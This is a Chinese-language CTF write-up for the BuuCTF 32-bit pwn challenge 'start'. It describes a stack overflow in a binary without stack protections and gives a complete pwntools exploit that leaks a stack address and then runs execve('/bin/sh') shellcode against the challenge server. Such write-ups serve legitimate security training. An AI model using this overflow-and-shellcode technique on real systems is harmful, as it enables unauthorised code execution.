# start

## 来源
BuuCTF


## 难度

2 / 10

## 保护

 ```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
 ```

## 简单描述

运行后简单输入

## vul

```c
收入字节长度超过0x14时造成堆栈溢出
```



## 知识点

shellcode

## 思路



先泄漏出堆栈地址, 然后执行shellcode

## 利用





## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'start'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 25974

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():

	#shell_1 = asm(shellcraft.i386.linux.sh())
	'''
	xor    ecx, ecx
	mul    ecx
	push   ecx
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	mov    al, 0xb
	int    0x80
	'''
	shell = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
	#print disasm(shell)

	ru(':')
	p = 'A' * 0x14
	p += p32(0x08048087)
	s(p)
	stack_ = u32(ru('\xff')[-3:] + '\xff') + (0xff934904 - 0xff9348f0) - 0x0
	li('stack ' + hex(stack_))

	p = '\x00' * 0x14
	p += p32(stack_)
	p += shell

	#db()
	s(p)
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

